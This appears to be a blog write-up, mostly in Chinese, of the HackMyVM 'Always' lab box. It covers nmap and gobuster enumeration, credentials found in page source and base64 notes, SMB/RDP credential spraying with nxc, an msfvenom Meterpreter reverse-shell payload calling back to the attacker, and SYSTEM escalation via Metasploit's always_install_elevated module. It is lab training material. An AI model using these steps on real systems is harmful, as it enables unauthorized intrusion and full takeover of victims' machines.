---
title: HackMyVM-Always
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Always.

> https://hackmyvm.eu/machines/machine.php?vm=Always
> 

Notes: **Beginner friendly, easy windows box. Basic enumeration skills and windows privilege escalation knowledge will open your way.**

## 前期踩点

```
⚡ root@kali  ~  nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 21:16 EST
Nmap scan report for 192.168.56.1
Host is up (0.00063s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00038s latency).
MAC Address: 08:00:27:F4:7A:59 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.37
Host is up (0.00049s latency).
MAC Address: 08:00:27:A1:59:19 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.10 seconds
```

```
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 21:20 EST
Warning: 192.168.56.37 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.37
Host is up (0.00090s latency).
Not shown: 65223 closed tcp ports (conn-refused), 299 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:A1:59:19 (Oracle VirtualBox virtual NIC)
```

```
⚡ root@kali  ~  nmap -sT -A -T4 -O -p 21,8080,3389,445,135,139 192.168.56.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 21:24 EST
Nmap scan report for 192.168.56.37
Host is up (0.00064s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Always-PC
| Not valid before: 2024-10-02T08:06:05
|_Not valid after:  2025-04-03T08:06:05
|_ssl-date: 2025-02-26T02:25:46+00:00; 0s from scanner time.
8080/tcp open  http               Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: We Are Sorry
MAC Address: 08:00:27:A1:59:19 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: ALWAYS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -29m59s, deviation: 59m59s, median: 0s
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Always-PC
|   NetBIOS computer name: ALWAYS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-26T04:25:41+02:00
| smb2-time:
|   date: 2025-02-26T02:25:41
|_  start_date: 2025-02-26T02:14:25
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ALWAYS-PC, NetBIOS user: , NetBIOS MAC: 08:00:27:a1:59:19 (Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 192.168.56.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.06 seconds
```

可以看到靶机不是域内主机，而是普通的工作组，主机可能是`win7`

```bash
⚡ root@kali  ~  nmap -script=vuln -p 21,8080,3389,445,135,139 192.168.56.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 21:47 EST
Nmap scan report for 192.168.56.37
Host is up (0.00056s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
|_ssl-ccs-injection: No reply from server (TIMEOUT)
8080/tcp open  http-proxy
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-trace: TRACE is enabled
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|_  /Admin/: Possible admin folder
MAC Address: 08:00:27:A1:59:19 (Oracle VirtualBox virtual NIC)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
```

`8080`端口是`web`服务。存在`ftp`，可能使用匿名账户进行登录。

优先级 `21` > `445` > `8080` 

尝试下`FTP`以及`SMB`是否允许匿名用户

```bash
⚡ root@kali  ~  ftp 192.168.56.37
Connected to 192.168.56.37.
220 Microsoft FTP Service
Name (192.168.56.37:root): anonymous
331 Password required for anonymous.
Password: 
530 User cannot log in.
ftp: Login failed
```

```bash
⚡ root@kali  ~  smbclient -L 192.168.56.37 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

访问`HTTP`服务，并收集指纹

![image.png](image%20133.png)

扫一下目录

```
⚡ root@kali  ~  gobuster dir -u http://192.168.56.37:8080 -w /usr/share/wordlists/dibuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x zip,txt,html,php,asp
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.37:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403,502,429
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,asp,zip,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 178]
/admin                (Status: 301) [Size: 240] [--> http://192.168.56.37:8080/admin/]
/Index.html           (Status: 200) [Size: 178]
/INDEX.html           (Status: 200) [Size: 178]
/Admin                (Status: 301) [Size: 240] [--> http://192.168.56.37:8080/Admin/]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

访问`admin`是登陆页

![image.png](image%20134.png)

## 前端验证

输入密码账号的时候会发现抓不到包，不会是前端验证吧

看一下源码还真的是，得到账号密码`admin`:`adminpass123`

![image.png](image%20135.png)

进去后有一串字符，一眼`base64` ，解码后是：`ftpuser`:`KeepGoingBro!!!`

![image.png](image%20136.png)

## FTP

得到一组用户名密码，看着像是`FTP`的用户

使用得到的用户名密码进行登录，成功进入

```bash
⚡ root@kali  ~  ftp 192.168.56.37
Connected to 192.168.56.37.
220 Microsoft FTP Service
Name (192.168.56.37:root): ftpuser
331 Password required for ftpuser.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

将文件拉取下来

```bash
ftp> ls
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
10-01-24  07:17PM                   56 robots.txt
226 Transfer complete.
ftp> get robots.txt
local: robots.txt remote: robots.txt
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |*******************************************************************************************************************************************************************|    56      118.62 KiB/s    00:00 ETA
226 Transfer complete.
56 bytes received in 00:00 (58.30 KiB/s)
```

得到文件`robots.txt` ，得到`/admins-secret-pagexxx.html`

```bash
⚡ root@kali  ~/Desktop/test/always  cat robots.txt        
User-agent: *
Disallow: /admins-secret-pagexxx.html
```

访问`/admins-secret-pagexxx.html`

![image.png](image%20137.png)

```bash
管理员的秘密笔记

1) 禁用防火墙和 Windows Defender。
2) 启用 FTP 和 SSH。
3) 启动 Apache 服务器。
4) 不要忘记更改用户“always”的密码。当前密码为“WW91Q2FudEZpbmRNZS4hLiE=”。
```

得到一组用户 `always`:`YouCantFindMe.!.!` 

但是我通过这凭证无法获得任何信息，随后我将之前的获得用户名和密码做了一个字典

```bash
always
YouCantFindMe.!.!
ftpuser
KeepGoingBro!!!
```

然后爆破

```bash
⚡ root@kali  ~/Desktop/test/always  nxc smb 192.168.56.37 -u up.txt -p up.txt
SMB         192.168.56.37   445    ALWAYS-PC        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\always:always STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\YouCantFindMe.!.!:always STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\ftpuser:always STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\KeepGoingBro!!!:always STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\always:YouCantFindMe.!.! STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\YouCantFindMe.!.!:YouCantFindMe.!.! STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\ftpuser:YouCantFindMe.!.! STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\KeepGoingBro!!!:YouCantFindMe.!.! STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\always:ftpuser STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\YouCantFindMe.!.!:ftpuser STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\ftpuser:ftpuser STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\KeepGoingBro!!!:ftpuser STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\always:KeepGoingBro!!! STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [-] Always-PC\YouCantFindMe.!.!:KeepGoingBro!!! STATUS_LOGON_FAILURE 
SMB         192.168.56.37   445    ALWAYS-PC        [+] Always-PC\ftpuser:KeepGoingBro!!! 
```

```bash
⚡ root@kali  ~/Desktop/test/always  nxc rdp 192.168.56.37 -u up.txt -p up.txt

RDP         192.168.56.37   3389   192.168.56.37    [*] Probably old, doesn't not support HYBRID or HYBRID_EX (nla:False)
RDP         192.168.56.37   3389   192.168.56.37    [-] None\always:always 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\YouCantFindMe.!.!:always 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\ftpuser:always 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\KeepGoingBro!!!:always 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\always:YouCantFindMe.!.! 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\YouCantFindMe.!.!:YouCantFindMe.!.! 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\ftpuser:YouCantFindMe.!.! 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\KeepGoingBro!!!:YouCantFindMe.!.! 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\always:ftpuser 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\YouCantFindMe.!.!:ftpuser 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\ftpuser:ftpuser 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\KeepGoingBro!!!:ftpuser 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\always:KeepGoingBro!!! 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\YouCantFindMe.!.!:KeepGoingBro!!! 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\ftpuser:KeepGoingBro!!! 
RDP         192.168.56.37   3389   192.168.56.37    [-] None\KeepGoingBro!!!:KeepGoingBro!!! 
```

发现`ftpuser`的凭据可以用到`smb` ，我们尝试通过使用`ftpuser`登录`rdp` ，当貌似其不是远程登录组的用户

![image.png](image%20138.png)

## 提权

很奇怪，没有想到可以利用的点，于是进行本地登录，记得先将左上角的键盘切换为`EN`

输入`ftpuser`用户密码后成功进入

![image.png](image%20139.png)

上线`MSF`，先生成`Payload`

```bash
⚡ root@kali  ~/Desktop/test/always  msfvenom -p windows/x64/meterpreter/reverse_tcp lpost=4444 lhost=192.168.56.4 -f exe -o shell.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

`MSF`监听

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set lhost 192.168.56.4
lhost => 192.168.56.4
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.56.4:4444 
```

将`shell.exe`上传到靶机，然后运行，即可获得`shell`

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.56.4:4444 
^[[D[*] Sending stage (203846 bytes) to 192.168.56.38
[*] Meterpreter session 1 opened (192.168.56.4:4444 -> 192.168.56.38:49159) at 2025-02-26 02:59:08 -0500

meterpreter > 
```

使用模块枚举提权方法

```bash
msf6 post(multi/recon/local_exploit_suggester) > run                                                                                                                                                                                
                                                                                                                                                                                                                                    
[*] 192.168.56.38 - Collecting local exploits for x64/windows...                                                                                                                                                                    
[*] 192.168.56.38 - 198 exploit checks are being tried...                                                                                                                                                                           
[+] 192.168.56.38 - exploit/windows/local/always_install_elevated: The target is vulnerable.                                                                                                                                        
[+] 192.168.56.38 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.                                                                                                                                 
[+] 192.168.56.38 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                                                                                                                                  
[+] 192.168.56.38 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.                                                                                                                           
[+] 192.168.56.38 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 192.168.56.38 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.                                                                                                                        
[+] 192.168.56.38 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!                               
[+] 192.168.56.38 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.        
[+] 192.168.56.38 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.                                                                                                                           
[+] 192.168.56.38 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.                                                                                                                          
[+] 192.168.56.38 - exploit/windows/local/ms15_078_atmfd_bof: The service is running, but could not be validated.                                                                                                                   
[+] 192.168.56.38 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.                                                                                                                             
[+] 192.168.56.38 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.                                                                                                                                          
[+] 192.168.56.38 - exploit/windows/local/virtual_box_opengl_escape: The service is running, but could not be validated.                                                
[*] Running check method for exploit 47 / 47                                                                                                                                                                                        
[*] 192.168.56.38 - Valid modules for session 1:                                                                                                                                                                                    
============================                                                                                                                                                                                                        
                                                                                                                                                                                                                                    
 #   Name                                                           Potentially Vulnerable?  Check Result                                                                                                                           
 -   ----                                                           -----------------------  ------------                                                                                                                           
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.                                     
 2   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.                             
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 6   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2021_40449                           Yes 
......
```

使用模块枚举出来的第一个模块来提权

```bash
msf6 exploit(windows/local/always_install_elevated) > set lhost 192.168.56.4
lhost => 192.168.56.4
msf6 exploit(windows/local/always_install_elevated) > set lport 1234
lport => 1234
msf6 exploit(windows/local/always_install_elevated) > set session 1
session => 1
msf6 exploit(windows/local/always_install_elevated) > run

[*] Started reverse TCP handler on 192.168.56.4:1234 
[*] Uploading the MSI to C:\Users\ftpuser\AppData\Local\Temp\vPVgqPs.msi ...
[*] Executing MSI...
[*] Sending stage (177734 bytes) to 192.168.56.38
[+] Deleted C:\Users\ftpuser\AppData\Local\Temp\vPVgqPs.msi
[*] Meterpreter session 2 opened (192.168.56.4:1234 -> 192.168.56.38:49161) at 2025-02-26 03:34:18 -0500

meterpreter > 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## UserFlag & RootFlag

```bash
C:\Users\Always\Desktop>type user.txt
type user.txt
HMV{You_Found_Me!}
```

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
HMV{White_Flag_Raised}
```